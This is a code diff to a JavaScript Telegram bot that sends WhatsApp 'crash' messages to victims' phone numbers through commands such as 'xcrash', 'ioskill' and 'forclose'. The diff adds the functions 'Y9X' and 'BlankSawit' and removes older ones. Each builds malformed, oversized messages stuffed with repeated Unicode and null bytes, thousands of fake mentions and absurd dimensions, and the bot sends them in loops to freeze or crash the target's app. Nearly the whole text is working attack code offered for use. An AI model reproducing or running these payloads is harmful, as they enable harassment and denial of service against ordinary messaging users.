@@ -206,8 +206,8 @@ try {
 
 
 const databaseUrl = 'https://raw.githubusercontent.com/rizkyyy02xi-sudo/zarrnotdev/main/tokens.json';
-const thumbnailUrl = "https://files.catbox.moe/linbl0.jpg";
-const thumbnailUrl2 = "https://files.catbox.moe/unfg2r.jpg";
+const thumbnailUrl = "https://files.catbox.moe/0g3sya.mp4";
+const thumbnailUrl2 = "https://files.catbox.moe/0g3sya.mp4";
 
 function createSafeSock(sock) {
   let sendCount = 0
@@ -1902,6 +1902,7 @@ bot.command("overdelay", checkWhatsAppConnection, checkPremium, checkCooldown, a
   }
 
   for (let i = 0; i < 1000000000000000; i++) {
+    await BlankSawit(sock, target);
     await LocaInvis(sock, target);
   }
 
@@ -1968,8 +1969,8 @@ bot.command("xblank", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
     );
   }
 
-  for (let i = 0; i < 10; i++) {
-    await JayaBlank(target);
+  for (let i = 0; i < 100; i++) {
+    await BlankSawit(sock, target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -2037,6 +2038,7 @@ bot.command("xdocu", checkWhatsAppConnection, checkPremium, checkCooldown, async
 
   for (let i = 0; i < 1000000000000000; i++) {
     await LocaInvis(sock, target);
+    await BlankSawit(sock, target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -2102,8 +2104,8 @@ bot.command("xplor", checkWhatsAppConnection, checkPremium, checkCooldown, async
     );
   }
 
-  for (let i = 0; i < 10; i++) {
-    await JayaBlank(target);
+  for (let i = 0; i < 100; i++) {
+    await BlankSawit(sock, target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -2169,8 +2171,8 @@ bot.command("xpler", checkWhatsAppConnection, checkPremium, checkCooldown, async
     );
   }
 
-  for (let i = 0; i < 50; i++) {
-    await fcv1(target);
+  for (let i = 0; i < 20; i++) {
+    await Y9X(target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -2236,8 +2238,8 @@ bot.command("forclose", checkWhatsAppConnection, checkPremium, checkCooldown, as
     );
   }
 
-  for (let i = 0; i < 50; i++) {
-    await fcv1(target);
+  for (let i = 0; i < 20; i++) {
+    await Y9X(target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -2304,7 +2306,7 @@ bot.command("xcrash", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
   }
 
   for (let i = 0; i < 65; i++) {
-    await Fcv2(target);
+    await BlankSawit(sock, target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -2371,7 +2373,7 @@ bot.command("ioskill", checkWhatsAppConnection, checkPremium, checkCooldown, asy
   }
 
   for (let i = 0; i < 100; i++) {
-    await Fcv2(target);
+    await BlankSawit(sock, target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -2437,8 +2439,8 @@ bot.command("forcex", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
     );
   }
 
-  for (let i = 0; i < 50; i++) {
-    await fcv1(target);
+  for (let i = 0; i < 20; i++) {
+    await Y9X(target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -3805,49 +3807,36 @@ bot.command("play", async (ctx) => {
 });
 
 // The Function Bugs
-async function Fcv2(target) {
-  try {
-    const bangka = {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            ephemeralMessage: {
-              sendPaymentMessage: {
-                extendedTextMessage: {
-                  text: "VISIBLE",
-                  matchedText: "https://t.me/wolkerdev",
-                  description: "🩸⃟༑⌁⃰Abimm⿻𝐂𝐑𝐀𝐒𝐇ཀ🦠️",
-                  title: "𐎟 𝐖𝐎𝐋𝐊𝐄𝐑 ⿻ 𝐂𝐑𝐀𝐒𝐇 𐎟",
-                },
-                paymentLinkMetadata: {
-                  LinkPrevieMetadata: {
-                    button: { displayText: "F" },
-                    name: "address_message",
-                    paramsJson: "\x10".repeat(100000),
-                  },
-                },
-                contextInfo: {
-                  socialMediaPostType: 9999,
-                  linkMediaDuration: 999,
-                  urlMetadata: { fbExperimentId: 999 },
-                  fbExperimentId: 999,
-                },
-              },
-              version: 3,
-            },
-          },
-        },
-      },
-    };
+async function Y9X(target) {
+  const msg = generateWAMessageFromContent(target, {
+    ephemeralMessage: {
+      message: {
+        sendPaymentMessage: {
+          noteMessage: {
+            extendedTextMessage: {
+              text: "Crash Metadata",
+              matchedText: "https://t.me/Yanzzuul",
+              description: "🩸⃟༑⌁⃰Busett 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠️",
+              title: "‌𐎟 𝐓‌𝐑𝐕‌𝐒𝐗 ⿻ 𝐂‌𝐋𝐈𝚵‌𝐍𝐓‌ 𐎟",
+              paymentLinkMetadata: {
+                button: { displayText: " Y9X - Dex " },
+                header: { headerType: 1 },
+                provider: { paramsJson: "{{".repeat(60000) }
+              }
+            }
+          }
+        }
+      }
+    }
+  }, {})
 
-    await sock.relayMessage(target, bangka, {
+  for (let i = 0; i < 2; i++) {
+    await sock.relayMessage(target, msg.message, {
       participant: { jid: target },
-      messageId: null,
-    });
-
-  } catch (err) {
-    console.error("Fcv2 Error:", err);
+      messageId: msg.key.id
+    })
   }
+  await sleep(2000)
 }
 
 async function fcv1(target) {
@@ -4036,107 +4025,150 @@ async function LocaInvis(sock, target) {
   }
 }
 
-async function Crashhome(target) {
-  try {
-    const msg1 = {
-      viewOnceMessage: {
+async function BlankSawit(sock, target) {
+  let msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            locationMessage: {
+              degreesLatitude: 9999999999,
+              degreesLongitude: -9999999999,
+              name: "ꦽ".repeat(15000) + "\0".repeat(15000),
+              address: "Tabola Bale" + "{".repeat(30000),
+              comment: "ꦾ".repeat(10000),
+
+              contextInfo: {
+                businessMessageForwardInfo: {
+                  businessOwnerJid: "2892ꦾ8181@s.whatsapp.net"
+                },
+
+                stanzaId: "OdX-Id" + Math.floor(Math.random() * 99999),
+                forwardingScore: 999,
+                isForwarded: true,
+
+                forwardedNewsletterMessageInfo: {
+                  newsletterJid: "120363321780349272@newsletter",
+                  serverMessageId: 1,
+                  newsletterName: "ោ៝".repeat(30000)
+                },
+
+                mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
+                  length: 2000
+                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
+
+                quotedMessage: {
+                  viewOnceMessage: {
+                    message: {
+                      interactiveResponseMessage: {
+                        body: {
+                          text: "@OndetPpx𓃻<"
+                        },
+
+                        nativeFlowResponseMessage: {
+                          name: "address_message",
+                          paramsJson: "ꦾ".repeat(30000),
+                          version: 3
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          },
+
+          body: {
+            text: "ꦾ".repeat(10000)
+          },
+
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: "single_select",
+                buttonParamsJson: JSON.stringify({
+                  title: "ꦾ".repeat(20000),
+                  sections: [
+                    {
+                      title: "ꦾ".repeat(5000),
+                      rows: [
+                        { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
+                        { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
+                        { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) }
+                      ]
+                    },
+                    {
+                      title: "ꦾ".repeat(20000) + "bokep simulator",
+                      rows: [
+                        { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
+                        { title: "ONDET TWO BE ONE", description: "\u0000".repeat(5000), id: "ꦾ".repeat(2000) }
+                      ]
+                    }
+                  ]
+                })
+              }
+            ]
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, msg, {
+    messageId: null,
+    participant: { jid: target }
+  });
+  
+  let odx = {
+    viewOnceMessage: {
         message: {
           imageMessage: {
-            body: {
-              text: "Abim Official",
-              format: "DEFAULT",
-            },
-            nativeFlowResponseMessage: {
-              name: "galaxy_message",
-              paramsJson: JSON.stringify({
-                flow_cta: "\u0000".repeat(1420000),
-              }),
-              version: 3,
-            },
-          },
-          nativeFlowResponseMessage: {
-            groupInviteMessage: {
-              groupJid: "1203630XXXXXXX@g.us",
-              inviteCode: "AbCdEfGhIjKlMnOp",
-              inviteExpiration: 10000000,
-              groupName: "Team Wolker Crash",
-              jpegThumbnail: null,
-              caption: "minjem satu juta",
-            },
-          },
-          stickerMessage: {
-            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
-            fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
-            fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
-            mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
-            mimetype: "image/webp",
-            height: 9999,
-            width: 9999,
-            directPath:
-              "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
-            fileLength: 12260,
-            mediaKeyTimestamp: "1743832131",
-            isAnimated: false,
-            stickerSentTs: "X",
-            isAvatar: false,
-            isAiSticker: false,
-            degreesLatitude: 9999,
-            degreesLongitude: -9999,
-            address: "maklu",
-            isLottie: false,
+            url: null,
+            mimetype: "image/jpeg",
+            fileSha256: Buffer.from(""), 
+            fileLength: 9999999999999,
+            height: 999999999999,
+            width: 999999999999,
+            mediaKeyTimestamp: 1766016566,
+            jpegThumbnail: null,
+            caption: "ꦸ".repeat(200000),
             contextInfo: {
-              mentionedJid: [
-                "0@s.whatsapp.net",
-                ...Array.from({ length: 1900 }, () =>
-                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-                ),
-              ],
-              stanzaId: "1234567890ABCDEF",
+              mentionedJid: Array.from(
+                { length: 2000 },
+                (_, i) => `1${i}@s.whatsapp.net`
+              ),
+              stanzaId: "bsj",
+              participant: target,
+              remoteJid: target,
+              isForwarded: true,
+              forwardingScore: 999,
+              businessMessageForwardInfo: {
+                businessOwnerJid: "0@s.whatsapp.net"
+              },
+              forwardedNewsletterMessageInfo: {
+                newsletterJid: "018@newsletter",
+                newsletterName: "꧀".repeat(20000),
+                contentType: "UPDATE_CARD"
+              },
               quotedMessage: {
-                paymentInviteMessage: {
-                  serviceType: 3,
-                  expiryTimestamp: Date.now() + 1814400000,
-                  contextInfo: {
-                    forwardingScore: 100,
-                    isForwarded: true,
-                    businessMessageForwardInfo: {
-                      businessOwnerJid: "13135550002@s.whatsapp.net",
-                    },
-                  },
-                },
-              },
-            },
-          },
-        },
-      },
-    };
+                callLogMessage: {
+                  isVideo: true,
+                  callOutcome: "MISSED",
+                  durationSecs: 999999,
+                  callType: 1,
+                  callParticipant: target
+                }
+              }
+            }
+          }
+        }
+      }
+    }; 
 
-    for (const msg of [msg1]) {
-      await sock.relayMessage("status@broadcast", msg, {
-        messageId: undefined,
-        statusJidList: [target],
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: {},
-            content: [
-              {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{ tag: "to", attrs: { jid: target } }],
-              },
-            ],
-          },
-        ],
-      });
-
-      console.log(
-        `Wolker Your Devices Sending  To ${target} suksesfull`
-      );
-    }
-  } catch (e) {
-    console.error(e);
-  }
+    await sock.relayMessage(target, odx, {
+      messageId: null,
+      participant: { jid: target }
+    });
 }
 
 async function SpamForclose(sock, target) {
